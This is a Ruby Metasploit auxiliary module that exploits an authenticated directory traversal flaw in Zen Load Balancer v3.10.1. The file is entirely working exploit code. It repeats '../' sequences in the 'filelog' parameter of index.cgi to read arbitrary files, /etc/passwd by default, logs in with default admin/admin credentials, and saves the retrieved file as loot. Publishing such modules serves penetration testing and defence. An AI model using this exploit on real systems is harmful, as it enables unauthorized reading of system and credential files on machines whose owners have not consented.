##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zen Load Balancer Directory Traversal',
        'Description' => %q{
          This module exploits a authenticated directory traversal vulnerability in Zen Load
          Balancer `v3.10.1`. The flaw exists in 'index.cgi' not properly handling 'filelog='
          parameter which allows a malicious actor to load arbitrary file path.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Basim Alabdullah', # Vulnerability discovery
          'Dhiraj Mishra'     # Metasploit module
        ],
        'References' => [
          ['EDB', '48308']
        ],
        'DisclosureDate' => '2020-04-10'
      )
    )

    register_options(
      [
        Opt::RPORT(444),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptInt.new('DEPTH', [true, 'The max traversal depth', 16]),
        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),
        OptString.new('TARGETURI', [true, 'The base URI path of the ZenConsole install', '/']),
        OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'admin']),
        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin'])
      ]
    )
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = '../' * datastore['DEPTH']

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.cgi'),
      'vars_get' =>
      {
        'id' => '2-3',
        'filelog' => "#{traversal}#{filename}",
        'nlines' => '100',
        'action' => 'See logs'
      },
      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
    }, 25)

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    print_good("#{peer} - Downloaded #{res.body.length} bytes")
    path = store_loot(
      'zenload.http',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
